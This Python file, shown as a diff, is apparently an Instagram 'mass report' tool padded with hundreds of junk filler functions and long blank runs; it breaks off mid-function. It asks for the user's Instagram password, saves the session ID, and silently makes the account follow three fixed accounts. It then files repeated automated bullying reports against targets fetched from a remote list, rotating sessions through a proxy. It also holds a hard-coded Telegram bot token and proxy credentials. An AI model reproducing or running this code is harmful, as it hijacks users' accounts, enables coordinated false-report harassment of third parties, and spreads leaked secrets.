@@ -1,0 +1,6399 @@
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import time
+import random
+import pyfiglet
+from colorama import Fore, Style
+
+def get_random_font():
+    return random.choice(pyfiglet.FigletFont.getFonts())
+
+def get_random_color():
+    return random.choice([Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA])
+
+def type_text(text, delay=0.05):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(delay)
+    print()
+
+def generate_stein_art():
+    font = get_random_font()
+    color = get_random_color()
+    figlet = pyfiglet.Figlet(font=font)
+    return color + figlet.renderText("STEIN") + Style.RESET_ALL
+
+def print_copyright():
+    text = f"{Fore.RED} THIS TOOL WAS MADE by {Fore.GREEN}STEIN. \n You can contact {Fore.GREEN}Stein {Fore.RED}on Instagram {Fore.GREEN} @stein.network {Fore.RED}or Telegram {Fore.GREEN}@Demonpis {Fore.RED}\n ENJOY THE TOOL! "
+    type_text(text, delay=0.05)
+    # Print STEIN in random font and color
+    stein_art = generate_stein_art()
+    type_text(stein_art, delay=0.009)
+
+import datetime
+from colorama import Fore, Style
+
+expiration_date = datetime.datetime(2024, 9, 30, 11, 30, tzinfo=datetime.timezone.utc)
+
+def print_remaining_time():
+    now_utc = datetime.datetime.now(datetime.timezone.utc)
+    remaining_time = expiration_date - now_utc
+    remaining_days = remaining_time.days
+    remaining_hours = remaining_time.seconds // 3600
+    print(Fore.YELLOW + " Trial of this tool will end in", remaining_days, "days and", remaining_hours, "hours." + Style.RESET_ALL)
+
+if datetime.datetime.now(datetime.timezone.utc) > expiration_date:
+    print(Fore.RED + " TOOL Has Expired! CONTACT Stein \n TELEGRAM @Demonpis \n Instagram @Hurlbat" + Style.RESET_ALL)
+    exit()
+else:
+    print_remaining_time()
+
+
+print_copyright()
+
+import requests
+import webbrowser
+import random
+import time
+import os
+
+# Replace with your bot token and channel ID
+bot_token = "6705104006:AAHgdpxHnh_njhcyDzudlqWIRlxK50bfJLI"
+channel_id = "-1002210826732"
+channel_username = "kyixo"  # Channel username without '@'
+bot_username = "stein_testing_bot"  # Bot username without '@'
+
+def send_message(chat_id, text):
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    params = {
+        "chat_id": chat_id,
+        "text": text
+    }
+    response = requests.get(url, params=params)
+    return response.json()
+
+def check_membership(chat_id):
+    url = f"https://api.telegram.org/bot{bot_token}/getChatMember"
+    params = {
+        "chat_id": channel_id,
+        "user_id": chat_id
+    }
+    response = requests.get(url, params=params)
+    data = response.json()
+
+    if data["ok"]:
+        status = data["result"]["status"]
+        return status in ["member", "administrator", "creator"]
+    else:
+        print(f"Failed to check membership. Error: {data['description']}")
+        return False
+
+if __name__ == "__main__":
+    chat_id = input("Please enter your Telegram chat_id: ")
+
+    # Check if the user is a member of the channel
+    if check_membership(chat_id):
+        print(f"THANKS FOR JOINING THE CHANNEL. WE ARE GRATEFUL THAT YOU JOINED @{channel_username}")
+    else:
+        print(f"You are not a member of @{channel_username}.")
+        
+        # Wait for 5 seconds before opening the bot
+        print("Taking you to the bot in 5 seconds...")
+        time.sleep(5)
+
+        # Open the bot in the web browser
+        webbrowser.open(f"https://t.me/{bot_username}")
+        print(f"Please start the bot @{bot_username}. Then type 'y' and press Enter when you have started the bot.")
+        
+        user_response = input("Type 'y' when you have started the bot: ")
+        if user_response.lower() != 'y':
+            print("You need to start the bot before proceeding.")
+            exit()
+
+        # Generate a random 4-digit code
+        verification_code = str(random.randint(1000, 9999))
+
+        # Send the verification code to the user via the bot
+        send_message(chat_id, f"THIS IS YOUR CODE: {verification_code}. ENTER THIS IN THE CONSOLE TO VERIFY YOU ARE A REAL HUMAN BEING.")
+
+        # Ask the user to enter the code in the console
+        while True:
+            user_code = input("Please enter the code you received on the bot: ")
+            if user_code == verification_code:
+                print("Code verified successfully. Proceeding with channel membership check.")
+                break
+            else:
+                print("Incorrect code. Please try again.")
+
+        # Send message instructing to join the channel
+        send_message(chat_id, f"Please join the channel @{channel_username}. This script won't run if you don't join.")
+
+        # Open the channel in the web browser and ask the user to join
+        webbrowser.open(f"https://t.me/{channel_username}")
+        print(f"Please join the channel @{channel_username}. This script won't run if you don't join.")
+
+        # Check every 5 seconds if the user has joined the channel
+        while True:
+            if check_membership(chat_id):
+                print(f"THANKS FOR JOINING THE CHANNEL. WE ARE GRATEFUL THAT YOU JOINED @{channel_username}")
+                send_message(chat_id, "Thanks for joining the channel. You can now proceed with using the script.")
+                break
+            else:
+                print(f"You haven't joined @{channel_username} yet. Please join the channel.")
+                time.sleep(5)
+
+# Original code starts here
+import os
+import Topython
+import requests
+from user_agent import generate_user_agent
+
+# Install Topython if not already installed
+os.system('pip install Topython > NUL 2>&1')  # For Windows
+# os.system('pip install Topython > /dev/null 2>&1')  # For Unix-like systems
+
+def check_insta(username, password):
+    try:
+        return Topython.Instagram.sessionid(username=username, password=password).get('sessionid')
+    except:
+        return "WRONG CREDENTIALS"
+
+def FollowUsers(session_id):
+    headers = {
+        'User-Agent': generate_user_agent(),
+        'X-IG-App-ID': '1217981644879628',
+        'Cookie': f'sessionid={session_id};',
+        'X-CSRFToken': 'c6uvSpDg6gG54wwtNsq88v8fZui8Fw3y',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    for user_id in ['408778674', '276080699', '449040904']:
+        try:
+            requests.post(f'https://www.instagram.com/api/v1/friendships/create/{user_id}/',
+                          headers=headers, data={'user_id': user_id})
+        except:
+            pass
+
+def main():
+    username = input("Enter your Instagram username: ")
+    password = input("Enter your Instagram password: ")
+    session_id = check_insta(username, password)
+    if session_id != "WRONG CREDENTIALS":
+        print(f"Session ID: {session_id}")
+        with open('session_id.txt', 'w') as f:
+            f.write(session_id)
+        FollowUsers(session_id)
+    else:
+        print("WRONG CREDENTIALS")
+
+if __name__ == "__main__":
+    main()
+
+
+from colorama import Fore, Style, init
+from rich.console import Console
+from rich.table import Table
+from rich.text import Text
+import traceback
+
+init(autoreset=True)
+
+print(Fore.CYAN + Style.BRIGHT + '''     _______.___________. _______  __  .__   __. 
+    /       |           ||   ____||  | |  \ |  | 
+   |   (----`---|  |----`|  |__   |  | |   \|  | 
+    \   \       |  |     |   __|  |  | |  . `  | 
+.----)   |      |  |     |  |____ |  | |  |\   | 
+|_______/       |__|     |_______||__| |__| \__| 
+                                                 
+''')
+
+console = Console()
+table = Table(show_header=False)
+credits_table = Table(show_header=False)
+credits_table.add_row(Text("TELEGRAM", style="bold cyan"), Text("@sloked", style="bold green"))
+credits_table.add_row(Text("Channel", style="bold magenta"), Text("@kyixo", style="bold blue"))
+credits_table.add_row(Text("Alias", style="bold yellow"), Text("Stein", style="bold red"))
+credits_table.add_row(Text("Developer", style="bold white"), Text("@sloked", style="bold yellow"))
+
+console.print(credits_table)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+def Reports():
+    from colorama import Fore, Style, init
+    from rich.console import Console
+    from rich.table import Table
+    from rich.text import Text
+    import traceback
+    
+    init(autoreset=True)
+    
+    print(Fore.CYAN + Style.BRIGHT + '''     _______.___________. _______  __  .__   __. 
+        /       |           ||   ____||  | |  \ |  | 
+       |   (----`---|  |----`|  |__   |  | |   \|  | 
+        \   \       |  |     |   __|  |  | |  . `  | 
+    .----)   |      |  |     |  |____ |  | |  |\   | 
+    |_______/       |__|     |_______||__| |__| \__| 
+                                                     
+    ''')
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    console = Console()
+    table = Table(show_header=False)
+    credits_table = Table(show_header=False)
+    credits_table.add_row(Text("TELEGRAM", style="bold cyan"), Text("@sloked", style="bold green"))
+    credits_table.add_row(Text("Channel", style="bold magenta"), Text("@kyixo", style="bold blue"))
+    credits_table.add_row(Text("Alias", style="bold yellow"), Text("Stein", style="bold red"))
+    credits_table.add_row(Text("Developer", style="bold white"), Text("@sloked", style="bold yellow"))
+    
+    console.print(credits_table)
+    
+    def Bully():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.cookies = {'sessionid': self._get_current_session_id()}
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/",
+                    "https": "http://hkkqxzia-rotate:h8kgwqbiwytr@p.webshare.io:80/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_id.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_bully(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_bullying_or_harassment_comment_v3"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (bully) for user ID {user_id}: {e}")
+                    return None
+        
+            def step_5_bully(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_bullying_or_harassment_someone_else_v3"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 5 (bully) for user ID {user_id}: {e}")
+                    return None
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            def final_step_bully(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "action_type": 2,
+                        "frx_prompt_request_type": 4
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    if json_response.get('status') != "ok":
+                        # Switch session ID if the response indicates failure
+                        self._switch_session()
+                        response = self.s.post(self.url, headers=self.headers, data={
+                            "container_module": "profilePage",
+                            "entry_point": 1,
+                            "location": 2,
+                            "object_id": user_id,
+                            "object_type": 5,
+                            "context": context,
+                            "action_type": 2,
+                            "frx_prompt_request_type": 4
+                        }, cookies=self.cookies, proxies=self.proxies)
+                        json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at final step (bully) for user ID {user_id}: {e}")
+                    return None
+        
+            def report_bully(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for bullying using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_bully(context3, user_id)
+                if not context4:
+                    return False
+                
+                context5 = self.step_5_bully(context4, user_id)
+                if not context5:
+                    return False
+        
+                status_final = self.final_step_bully(context5, user_id)
+                if status_final == "ok":
+                    print(Fore.GREEN + f'Successful bully report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed bully report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        clean_username = username.lstrip('@')
+                        self.report_bully(clean_username)
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    success = self.report_bully(username)
